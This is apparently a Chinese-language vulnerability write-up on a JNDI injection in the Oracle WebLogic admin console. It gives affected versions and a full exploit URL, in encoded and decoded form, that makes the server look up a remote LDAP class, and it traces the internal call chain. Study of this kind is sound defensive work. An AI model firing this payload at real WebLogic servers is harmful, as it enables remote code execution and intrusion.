    Weblogic JNDI 注入 #

    环境搭建 #

    还是之前使用的 Weblogic 环境，不过在调试的时候需要手动把\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar添加到依赖中。

    漏洞分析与复现 #

    影响版本和前提条件 #

    Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。

    前提：拥有访问 /console/consolejndi.portal 页面的用户权限，或者存在 CVE-2020-14883 未授权访问漏洞。

    漏洞原理 #

    WebLogic 的 /console/consolejndi.portal 接口可以调用存在 JNDI 注入漏洞的 com.bea.console.handles.JndiBindingHandle 类，从而造成 RCE。

    漏洞复现 #

    payload：http://127.0.0.1:7001/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127.0.0;1:1389/aew0xy;AdminServer%22)

    本地开启一个 JNDI 的Evil Class 和 Server。

    这里使用的是别人复现时的图片，自己用 kali 来复现是不太一样的，用 kali 复现的时候建议使用 DNSLog，这样能清楚地看到命令是否正常执行。

    总结 #

    先看一下我实际复现时解码的 payload：http://192.168.110.128:7001/console/css/../consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://10.0.0;10:1389/remoteExploit7;AdminServer")

    这里关注一下JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://10.0.0;10:1389/remoteExploit7;AdminServer")这个参数。

    当我们传入这个参数时HandleFactory会分离类和参数，然后反射调用来实例化JndiBindingHandle并把我们的 LDAP 传进去。

    实际上 Weblogic 在处理请求的时候会用一个BreadcrumbBacking来管理页面导航和参数，它会扫描请求中所有以handle结尾的参数，把JNDIBindingPortlethandle的值给收集起来，然后交给HandleFactory.getHandle()来实例化JndiBindingHandle对象。

    Weblogic 控制台页面由多个Portlet组成，而JNDIBindingPageGeneral这个页面中有一个 Portlet 的名字和JndiBindingHandle关联，当框架解析出 JndiBindingHandle 后，会把它和对应的 Portlet 绑定，并确定这个 Portlet 要执行的动作是 JNDIBindingAction。然后就会调用到JNDIBindingAction.execute()，从JndiBindingHandle中取出 JNDI 然后调用lookup()。

    所以整条链是： 请求参数 → BreadcrumbBacking 收集 → HandleFactory 解析出 JndiBindingHandle → 绑定到 JNDIBindingPortlet → 触发 JNDIBindingAction.execute() → lookup(恶意LDAP) → JNDI注入。
